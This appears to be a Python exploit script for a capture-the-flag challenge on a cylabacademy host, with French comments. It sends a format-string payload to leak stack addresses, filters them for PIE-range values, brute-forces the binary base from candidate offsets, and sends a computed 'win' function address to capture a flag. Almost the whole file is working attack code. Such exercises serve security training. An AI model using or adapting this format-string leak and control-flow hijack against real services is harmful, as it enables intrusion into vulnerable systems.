import sys, re, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "xebec.cylabacademy.net", 34549
WIN_OFF = 0x1376

s = socket.create_connection((HOST, PORT), timeout=20)
s.settimeout(6)
time.sleep(0.5)
try:
    print("banner:", s.recv(4096).decode("utf-8", "replace")[:200])
except Exception:
    pass
fmt = ".".join(f"%{i}$p" for i in range(1, 21))
s.sendall((fmt + "\n").encode())
time.sleep(0.8)
out = b""
try:
    while True:
        c = s.recv(8192)
        if not c:
            break
        out += c
        if b"0x12345" in out:
            break
except Exception:
    pass
txt = out.decode("utf-8", "replace")
print("leak brut:", txt[:400])
cands = []
for m in re.finditer(r"0x[0-9a-f]{6,12}", txt):
    v = int(m.group(0), 16)
    if 0x500000000000 <= v <= 0x7fffffffffff:
        cands.append(v)
print("candidats PIE:", [hex(c) for c in cands[:8]])
if cands:
    # base = valeur & ~0xfff (page) puis trouver l'offset plausible
    for c in cands:
        for off in (0x1418 - 0x1418, 0x1440, 0x14b4, 0x12ca, 0x1300):
            base = c - off
            if base & 0xfff == 0:
                win = base + WIN_OFF
                print(f"  essai base={hex(base)} (off {hex(off)}) -> win={hex(win)}")
                s2 = socket.create_connection((HOST, PORT), timeout=20)
                s2.settimeout(6)
                time.sleep(0.4)
                try:
                    s2.recv(4096)
                except Exception:
                    pass
                s2.sendall((fmt + "\n").encode())
                time.sleep(0.6)
                try:
                    s2.recv(8192)
                except Exception:
                    pass
                s2.sendall((hex(win) + "\n").encode())
                time.sleep(0.8)
                r = b""
                try:
                    r = s2.recv(8192)
                except Exception:
                    pass
                rt = r.decode("utf-8", "replace")
                s2.close()
                print("   reponse:", rt[:200].replace("\n", " "))
                fl = re.search(r"(?:academy|picoCTF)\{[^}]*\}", rt)
                if fl:
                    print("FLAG:", fl.group(0))
                    sys.exit(0)
s.close()
